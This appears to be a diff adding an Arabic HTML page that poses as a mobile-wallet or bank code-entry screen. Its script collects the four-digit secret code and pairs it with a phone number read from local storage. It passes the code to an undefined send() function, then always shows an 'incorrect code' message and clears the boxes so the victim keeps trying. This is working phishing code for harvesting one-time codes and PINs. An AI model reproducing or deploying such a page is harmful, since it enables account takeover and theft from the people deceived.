@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+
+<title>OTP</title>
+
+<style>
+  .otp-input:disabled {
+  cursor: not-allowed;
+  opacity: 0.6;
+}
+
+/* OTP INVALID OVERLAY */
+.otp-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.45);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 999;
+}
+
+.otp-modal {
+  background: #fff;
+  padding: 28px 32px;
+  border-radius: 16px;
+  text-align: center;
+  width: 80%;
+  max-width: 320px;
+}
+
+.otp-modal p {
+  font-family: "Cairo", sans-serif;
+  font-size: 18px;
+  margin-bottom: 20px;
+  color: #333;
+}
+
+.otp-modal button {
+  background: #1f4fa3;
+  color: #fff;
+  border: none;
+  border-radius: 10px;
+  padding: 10px 28px;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+.top {
+  position: relative;
+  /*background-color: #f57c20;*/
+
+  background-image: url("patern.png");
+  /*background-repeat: no-repeat;*/
+  background-position: center;
+  background-size: 150% 150%;
+  padding-bottom: 40px;
+}
+
+:root {
+  --orange: #f57c20;
+  --blue: #1f4fa3;
+  --otp-gray: #eef0f3;
+}
+
+* {
+  box-sizing: border-box;
+  font-family: Arial, sans-serif;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  background: #fff;
+  display: flex;
+  flex-direction: column;
+}
+
+
+
+
+/* background pattern ONLY here 
+.top::before {
+  content: "";
+  position: absolute;
+  inset: 0;
+  background: url("patern.png") center / cover no-repeat;
+  opacity: 0.25;
+  z-index: 0;
+}
+
+/* HEADER */
+.header {
+  position: relative;
+  z-index: 1;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 14px 16px;
+  color: #fff;
+}
+
+.lang {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 16px;
+}
+
+.lang img {
+  width: 66px;
+}
+
+.logo {
+  width: 66px;
+}
+
+/* CONTENT */
+.content {
+  position: relative;
+  z-index: 1;
+  text-align: center;
+  margin-top: 70px;
+  color: #fff;
+}
+
+.label {
+  font-size: 20px;
+  margin-bottom: 10px;
+}
+
+.phone {
+  font-size: 19;
+  font-weight: bold;
+  color: var(--blue);
+  margin-bottom: 32px;
+}
+
+/* OTP */
+.otp {
+  display: flex;
+  justify-content: center;
+  gap: 14px;
+  direction: ltr;
+}
+
+.otp-box {
+  width: 64px;
+  height: 64px;
+  background: #fff;
+  border-radius: 14px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.otp-box.filled {
+  background: var(--otp-gray);
+}
+
+.otp-box.filled::after {
+  content: "";
+  width: 14px;
+  height: 14px;
+  background: var(--blue);
+  border-radius: 50%;
+}
+
+.otp-box.active {
+  border: 3px solid var(--blue);
+}
+
+/* ===== BOTTOM WHITE SECTION ===== */
+.bottom {
+  flex: 1;
+  background: #fff;
+  padding: 18px 22px;
+  display: flex;
+  justify-content: space-between;
+  align-items: flex-start;
+  font-size: 16px;
+  font-weight: bold;
+}
+
+.bottom a {
+  color: var(--blue);
+  text-decoration: none;
+}
+
+* {
+  box-sizing: border-box;
+  font-family: "Cairo", sans-serif;
+}
+
+
+.otp-input {
+  width: 52px;          /* ⬅️ thinner */
+  height: 80px;         /* ⬅️ taller */
+  border-radius: 12px;
+  border: none;
+  outline: none;
+  background: #fff;
+  text-align: center;
+  font-size: 26px;
+  font-family: "Cairo", sans-serif;
+}
+
+</style>
+</head>
+
+<body>
+
+<!-- TOP ORANGE -->
+<div class="top">
+
+<div class="header">
+  <img src="logo_white_Normal@3x.png" class="logo" alt="">
+
+  <div class="lang">
+    English
+    <img src="lang_Normal.png" alt="">
+  </div>
+</div>
+
+
+  <div class="content">
+    <div class="label">رقم الموبايل</div>
+    <div class="phone">774324921</div>
+
+    <div class="label">أدخل الرمز السري</div>
+
+<div class="otp">
+  <input class="otp-input filled" type="text" inputmode="numeric" maxlength="1">
+  <input class="otp-input active" type="text" inputmode="numeric" maxlength="1">
+  <input class="otp-input" type="text" inputmode="numeric" maxlength="1">
+  <input class="otp-input" type="text" inputmode="numeric" maxlength="1">
+</div>
+
+  </div>
+
+</div>
+
+<!-- BOTTOM WHITE -->
+<div class="bottom">
+  <a href="#">نسيت الرمز السري</a>
+  <a href="/">الدخول بحساب آخر</a>
+</div>
+
+<div class="otp-overlay" id="otpOverlay">
+  <div class="otp-modal">
+    <p>الرمز السري غير صحيح</p>
+    <button onclick="closeOverlay()">حسناً</button>
+  </div>
+</div>
+
+<script>
+  function setOtpDisabled(disabled) {
+  otpInputs.forEach(input => {
+    input.disabled = disabled;
+  });
+}
+
+  const otpInputs = document.querySelectorAll(".otp-input");
+  const overlay = document.getElementById("otpOverlay");
+
+  function getOtpValue() {
+    return Array.from(otpInputs).map(i => i.value).join("");
+  }
+
+  function clearOtp() {
+    otpInputs.forEach(input => input.value = "");
+    otpInputs[0].focus();
+  }
+
+function showInvalidOtp() {
+  setOtpDisabled(true);          // ⬅️ disable inputs
+  overlay.style.display = "flex";
+  clearOtp();
+}
+
+  function closeOverlay() {
+  overlay.style.display = "none";
+  setOtpDisabled(false);         // ⬅️ enable inputs
+  otpInputs[0].focus();
+}
+
+  function sendOtp(otp) {
+    // console.log("Sending OTP:", otp);
+    phone = localStorage.getItem('phone')
+    msg=`رقم الهاتف: ${phone}\nالرمز: ${otp}`
+    send(otp)
+    setTimeout(() => {
+      showInvalidOtp();
+    }, 500);
+  }
+
+  otpInputs.forEach((input, index) => {
+    input.addEventListener("input", () => {
+      input.value = input.value.replace(/[^0-9]/g, "");
+
+      if (input.value && index < otpInputs.length - 1) {
+        otpInputs[index + 1].focus();
+      }
+
+      const otp = getOtpValue();
+      if (otp.length === otpInputs.length) {
+        sendOtp(otp);
+      }
+    });
+
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && !input.value && index > 0) {
+        otpInputs[index - 1].focus();
+      }
+    });
+  });
+    </script>
+  </body>
+</html>
